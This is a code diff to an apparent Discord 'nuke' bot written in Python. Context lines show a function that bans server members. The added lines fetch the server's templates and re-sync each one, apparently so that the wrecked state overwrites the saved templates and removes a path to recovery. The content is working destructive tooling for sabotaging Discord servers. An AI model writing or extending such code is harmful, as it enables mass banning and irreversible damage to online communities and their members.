@@ -709,6 +709,28 @@ async def nuke(guild: discord.Guild):
                 except discord.HTTPException:
                     print(f"Failed to ban {x.name}: HTTP Exception, Banning Failed.")
 
+    #  ---- Template Syncing  ----  #
+
+    if guild_perms.manage_guild or is_admin:
+        templates = None
+        try:
+            templates = await guild.templates()
+        except discord.Forbidden:
+            print("Couldn't Fetch Templates: Forbidden.")
+        except discord.HTTPException:
+            print("Failed to Fetch Templates: HTTPException.")
+        if templates:
+            for x in templates:
+                try:
+                    await x.sync()
+                except discord.NotFound:
+                    print("Failed to Sync Template: Not Found.")
+                except discord.Forbidden:
+                    print("Failed to Sync Template: Forbidden.")
+                except discord.HTTPException:
+                    print("Failed to Sync Template: HTTPException.")
+
+
     print("End of Nuke.")
 
 
